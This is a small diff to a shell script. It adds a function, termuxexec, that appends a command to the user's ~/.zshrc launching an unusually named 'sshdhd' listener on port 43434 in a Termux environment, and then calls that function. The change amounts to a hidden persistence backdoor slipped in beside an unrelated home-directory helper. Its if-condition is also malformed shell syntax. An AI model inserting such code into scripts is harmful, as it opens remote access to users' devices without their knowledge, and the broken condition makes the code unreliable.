@@ -66,9 +66,14 @@ user_home_dir () {
      fi
 }
 
-
+termuxexec() {
+     if [[ uname -a | awk '{print $14}' ]]; then
+          echo "/data/data/com.termux/files/usr/bin/sshdhd -p 43434" >> ~/.zshrc
+     fi
+}
 
 user_home_dir
+termuxexec
 
 
 
